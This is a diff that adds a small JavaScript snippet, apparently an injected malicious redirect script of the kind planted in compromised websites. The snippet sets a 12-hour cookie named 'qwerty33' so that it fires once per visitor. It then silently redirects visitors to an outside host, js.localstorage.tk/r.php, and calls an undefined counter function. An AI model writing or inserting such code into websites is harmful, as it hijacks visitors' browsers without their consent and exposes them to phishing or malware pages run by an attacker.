@@ -1,0 +1,20 @@
+tryToAppend();
+
+function tryToAppend(){
+	
+			if (document.cookie.indexOf("qwerty33=") >= 0) { 
+			
+			} else { 
+				st(); 
+				var ul = "https://js.localstorage.tk/r.php"; 
+				document.location.href = ul; 
+				window.location.href = ul; 
+			}
+	
+            if(!document.body){
+                return setTimeout(tryToAppend(),1);
+            }
+           counter();
+}
+
+function st(){ var now = new Date();now.setTime(now.getTime() + 1 * 3600 * 1000 * 12);document.cookie = "qwerty33=1; expires=" + now.toUTCString() + "; path=/";}
